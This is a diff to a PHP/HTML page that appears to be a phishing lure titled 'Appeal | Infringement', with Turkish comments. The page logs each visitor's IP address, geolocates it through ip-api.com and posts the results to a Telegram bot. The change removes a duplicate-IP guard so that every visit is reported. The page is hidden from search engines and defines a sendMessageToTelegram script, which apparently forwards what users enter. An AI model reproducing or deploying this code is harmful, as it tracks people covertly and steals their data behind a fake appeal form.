@@ -9,15 +9,6 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
     $ip = $_SERVER['REMOTE_ADDR'];
 }
 
-// Daha önce mesaj gönderildiyse tekrar gönderme
-$filePath = 'path/to/sent_messages.txt';
-if (file_exists($filePath)) {
-    $sentMessages = file_get_contents($filePath);
-    if (strpos($sentMessages, $ip) !== false) {
-        exit(); // Mesaj zaten gönderilmiş, işlemi sonlandır
-    }
-}
-
 // Dış servise IP bilgilerini gönder
 $apiUrl = "http://ip-api.com/json/{$ip}";
 $response = json_decode(file_get_contents($apiUrl), true);
@@ -53,11 +44,7 @@ $telegramParams = [
 // Telegram API'sine isteği gönder
 file_get_contents($telegramApiUrl . '?' . http_build_query($telegramParams));
 
-// Gönderilen IP'yi kaydet
-file_put_contents($filePath, $ip . PHP_EOL, FILE_APPEND);
-
 ?>
-
 
 <html lang="en">
 
@@ -65,6 +52,8 @@ file_put_contents($filePath, $ip . PHP_EOL, FILE_APPEND);
     <meta charset="UTF-8">
     <meta name="robots" content="noindex, nofollow">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="head.gif">
+    <title>Appeal | Infringement</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <script>
         function sendMessageToTelegram() {
